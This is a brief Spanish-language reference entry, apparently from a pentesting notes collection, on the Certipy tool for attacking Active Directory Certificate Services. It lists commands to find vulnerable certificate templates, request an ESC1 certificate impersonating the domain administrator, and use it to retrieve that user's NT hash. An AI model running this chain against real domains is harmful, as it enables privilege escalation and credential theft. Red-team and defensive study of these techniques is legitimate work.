---
title: Certipy
resumen: Enumera y explota plantillas de certificados de ADCS vulnerables (ESC1-ESC8) desde Linux.
tags: credential-access
---

Herramienta en Python para enumerar y atacar AD Certificate Services (ADCS) desde Linux, cubriendo los escenarios de abuso catalogados como ESC1-ESC8.

```bash
# Enumerar plantillas y detectar cuáles son vulnerables
certipy find -u 'usuario@dominio.local' -p 'contraseña' -dc-ip IP_DC -vulnerable

# Explotar una plantilla ESC1 (permite especificar un SAN arbitrario) suplantando a un usuario privilegiado
certipy req -u 'usuario@dominio.local' -p 'contraseña' -ca 'NombreCA' -template 'PlantillaVulnerable' -upn 'administrator@dominio.local'

# Autenticarse con el certificado obtenido y recuperar el hash NT del usuario suplantado
certipy auth -pfx administrator.pfx -dc-ip IP_DC
```

### Técnicas donde aparece

[[adcs-abuse]]
